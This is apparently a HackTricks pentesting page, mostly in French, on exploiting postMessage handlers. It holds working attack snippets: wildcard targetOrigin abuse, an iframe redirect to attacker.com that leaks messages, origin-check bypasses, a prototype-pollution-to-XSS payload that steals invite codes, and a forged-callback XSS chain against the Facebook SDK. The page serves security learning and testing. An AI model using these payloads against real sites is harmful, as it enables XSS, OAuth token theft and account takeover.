# PostMessage Vulnérabilités

{{#include ../../banners/hacktricks-training.md}}

## Envoyer **PostMessage**

**PostMessage** utilise la fonction suivante pour envoyer un message :
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Notez que **targetOrigin** peut être '\*' ou une URL comme _https://company.com._\
Dans le **deuxième scénario**, le **message ne peut être envoyé qu'à ce domaine** (même si l'origin de l'objet Window est différent).\
Si le **wildcard** est utilisé, **les messages peuvent être envoyés vers n'importe quel domaine**, et seront envoyés vers l'origin de l'objet Window.

### Attaquer iframe & wildcard dans **targetOrigin**

Comme expliqué dans [**ce rapport**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) si vous trouvez une page qui peut être **iframed** (no `X-Frame-Header` protection) et qui **envoie des messages sensibles** via **postMessage** en utilisant un **wildcard** (\*), vous pouvez **modifier** l'**origin** de l'**iframe** et **leak** le message **sensible** vers un domaine contrôlé par vous.\
Notez que si la page peut être iframed mais que le **targetOrigin** est **défini sur une URL et non sur un wildcard**, cette **astuce ne fonctionnera pas**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** est la fonction utilisée par JS pour déclarer la fonction qui **attend des `postMessages`**.\
Un code similaire au suivant sera utilisé :
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Notez dans ce cas comment la **première chose** que fait le code est de **vérifier l'origine**. C'est terriblement **important**, surtout si la page va faire **quelque chose de sensible** avec l'information reçue (comme changer un mot de passe). **Si elle ne vérifie pas l'origine, des attaquants peuvent faire envoyer aux victimes des données arbitraires à ces endpoints** et changer les mots de passe des victimes (dans cet exemple).

### Enumeration

Pour **trouver les event listeners** sur la page courante, vous pouvez :

- **Rechercher** dans le code JS `window.addEventListener` et `$(window).on` (_JQuery version_)
- **Exécuter** dans la console des outils de développement : `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Aller** dans _Elements --> Event Listeners_ dans les outils de développement du navigateur

![](<../../images/image (396).png>)

- Utiliser une **extension de navigateur** comme [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ou [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Cette extension interceptera **tous les messages** et vous les affichera.

### Origin check bypasses

- L'attribut **`event.isTrusted`** est considéré comme sécurisé car il retourne `True` uniquement pour les événements générés par de véritables actions utilisateur. Bien qu'il soit difficile à contourner s'il est correctement implémenté, son importance dans les vérifications de sécurité est notable.
- L'utilisation de **`indexOf()`** pour la validation de l'origine dans les événements postMessage peut être susceptible d'être contournée. Un exemple illustrant cette vulnérabilité est :

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- La méthode **`search()`** de `String.prototype.search()` est destinée aux expressions régulières, pas aux chaînes. Passer autre chose qu'un regexp entraîne une conversion implicite en regex, rendant la méthode potentiellement insécurisée. Ceci parce que dans les regex, un point (.) agit comme un joker, permettant de contourner la validation avec des domaines spécialement construits. Par exemple :

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- La fonction **`match()`**, similaire à `search()`, traite des regex. Si la regex est mal construite, elle peut être sujette à un contournement.
- La fonction **`escapeHtml`** est destinée à assainir les entrées en échappant les caractères. Cependant, elle ne crée pas un nouvel objet échappé mais écrase les propriétés de l'objet existant. Ce comportement peut être exploité. En particulier, si un objet peut être manipulé de sorte que sa propriété contrôlée ne possède pas `hasOwnProperty`, `escapeHtml` ne fonctionnera pas comme prévu. Ceci est démontré dans les exemples ci-dessous :

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Dans le contexte de cette vulnérabilité, l'objet `File` est particulièrement exploitable en raison de sa propriété en lecture seule `name`. Cette propriété, lorsqu'elle est utilisée dans des templates, n'est pas échappée par la fonction `escapeHtml`, ce qui entraîne des risques de sécurité potentiels.

- La propriété `document.domain` en JavaScript peut être définie par un script pour raccourcir le domaine, permettant une application plus souple de la same-origin policy au sein du même domaine parent.

### Origin-only trust + trusted relays

Si un récepteur ne vérifie que **`event.origin`** (par ex. fait confiance à n'importe quel `*.trusted.com`), vous pouvez souvent trouver une page **"relay" sur cette origine qui renvoie des paramètres contrôlés par l'attaquant via `postMessage`** vers un `targetOrigin`/`targetWindow` fourni. Des exemples incluent des gadgets marketing/analytics qui prennent des query params et transmettent `{msg_type, access_token, ...}` à `opener`/`parent`. Vous pouvez :

- **Ouvrir la page victime dans un popup/iframe qui a un `opener`** afin que ses handlers s'enregistrent (beaucoup de pixels/SDKs n'attachent des listeners que lorsque `window.opener` existe).
- **Naviguer une autre fenêtre d'attaquant vers le relay endpoint sur l'origine de confiance**, en remplissant les champs du message que vous voulez injecter (message type, tokens, nonces).
- Parce que le message provient maintenant **de l'origine de confiance**, la validation basée uniquement sur l'origine passe et vous pouvez déclencher des comportements privilégiés (changements d'état, appels API, écritures DOM) dans le listener de la victime.

Patterns d'abus observés sur le terrain :

- Les SDKs d'analytics (p.ex. pixel/fbevents-style) consomment des messages comme `FACEBOOK_IWL_BOOTSTRAP`, puis **appellent des backend APIs en utilisant un token fourni dans le message** et incluent **`location.href` / `document.referrer`** dans le corps de la requête. Si vous fournissez votre propre token, vous pouvez **lire ces requêtes dans l'historique/logs de requêtes du token** et exfiltrer **OAuth codes/tokens** présents dans l'URL/referrer de la page victime.
- Tout relay qui reflète des champs arbitraires dans `postMessage` vous permet de **spoof message types** attendus par des listeners privilégiés. Combinez cela avec une validation d'entrée faible pour atteindre des appels Graph/REST, des déblocages de fonctionnalités, ou des flux équivalents à CSRF.

Astuces de hunting : énumérez les listeners `postMessage` qui ne vérifient que `event.origin`, puis cherchez des **same-origin HTML/JS endpoints qui transmettent des URL params via `postMessage`** (marketing previews, login popups, OAuth error pages). Assemblez les deux avec `window.open()` + `postMessage` pour contourner les vérifications d'origine.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

It's possible to check if the message came from the same window the script is listening in (specially interesting for **Content Scripts from browser extensions** to check if the message was sent from the same page):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Vous pouvez forcer **`e.source`** d'un message à null en créant un **iframe** qui **sends** le **postMessage** et est **immédiatement supprimé**.

Pour plus d'informations **lisez :**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Afin d'effectuer ces attaques, idéalement vous pourrez **mettre la page web victime** à l'intérieur d'un `iframe`. Mais certains en-têtes comme `X-Frame-Header` peuvent **empêcher** ce **comportement**.\
Dans ces scénarios, vous pouvez quand même utiliser une attaque moins discrète. Vous pouvez ouvrir un nouvel onglet vers l'application web vulnérable et communiquer avec elle :
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Stealing message sent to child by blocking the main page

Dans la page suivante vous pouvez voir comment vous pourriez voler des **sensitive postmessage data** envoyées à un **child iframe** en **blocking** la page **main** avant l'envoi des données et en abusant d'une **XSS in the child** pour **leak the data** avant qu'elles ne soient reçues :


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Stealing message by modifying iframe location

Si vous pouvez iframe une page web sans X-Frame-Header qui contient un autre iframe, vous pouvez **change the location of that child iframe**, donc si elle reçoit un **postmessage** envoyé en utilisant un **wildcard**, un attaquant pourrait **change** cet iframe **origin** vers une page **controlled** par lui et **steal** le message :


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage to Prototype Pollution and/or XSS

Dans des scénarios où les données envoyées via `postMessage` sont exécutées par JS, vous pouvez **iframe** la **page** et **exploit** la **Prototype Pollution/XSS** en envoyant l'exploit via `postMessage`.

A couple of **very good explained XSS though `postMessage`** can be found in [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Example of an exploit to abuse **Prototype Pollution and then XSS** through a `postMessage` to an `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Pour **plus d'informations** :

- Lien vers la page sur [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Lien vers la page sur [**XSS**](../xss-cross-site-scripting/index.html)
- Lien vers la page sur [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Prédiction des tokens de callback **`Math.random()`** dans les bridges postMessage

Lorsque la validation des messages utilise un « secret partagé » généré avec `Math.random()` (par ex., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) et que le même helper nomme aussi les iframes de plugin, vous pouvez récupérer les sorties du PRNG et falsifier des messages de confiance :

- **Leak PRNG outputs via `window.name`:** Le SDK nomme automatiquement les iframes de plugin avec `guid()`. Si vous contrôlez la frame supérieure, chargez la page victime dans une iframe, puis naviguez l'iframe du plugin vers votre origine (par ex., `window.frames[0].frames[0].location='https://attacker.com'`) et lisez `window.frames[0].frames[0].name` pour obtenir une sortie brute de `Math.random()`.
- **Forcer plus de sorties sans rechargements :** Certains SDK exposent un chemin de reinit ; dans le FB SDK, déclencher `init:post` avec `{xfbml:1}` force `XFBML.parse()`, détruit/recrée l'iframe du plugin et génère de nouveaux noms/IDs de callback. Une réinitialisation répétée produit autant de sorties PRNG que nécessaire (attention aux appels internes supplémentaires à `Math.random()` pour les IDs de callback/iframe, donc les solveurs doivent sauter les valeurs intermédiaires).
- **Trusted-origin delivery via parameter pollution :** Si un endpoint plugin first-party reflète un paramètre non assaini dans la payload cross-window (par ex., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), vous pouvez injecter `&type=...&iconSVG=...` tout en préservant l'origine de confiance `facebook.com`.
- **Predict the next callback :** Convert leaked iframe names back to floats in `[0,1)` and feed several values (even non-consecutive) into a V8 `Math.random` predictor (e.g., Z3-based). Génèrez le prochain `guid()` localement pour falsifier le token de callback attendu.
- **Trigger the sink :** Concevez les données postMessage de sorte que le bridge déclenche `xd.mpn.setupIconIframe` et injecte du HTML dans `iconSVG` (par ex., encodé en URL `<img src=x onerror=...>`), réalisant un DOM XSS dans l'origine hébergeuse ; à partir de là, les iframes de même origine (dialogs OAuth, arbiters, etc.) peuvent être lus.
- **Framing quirks help :** La chaîne nécessite du framing. Dans certains webviews mobiles, `X-Frame-Options` peut dégrader en `ALLOW-FROM` non supporté quand `frame-ancestors` est présent, et des paramètres “compat” peuvent forcer des `frame-ancestors` permissifs, permettant le canal `window.name`.

#### Exemple minimal de message falsifié
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Références

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Pour s'entraîner : [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
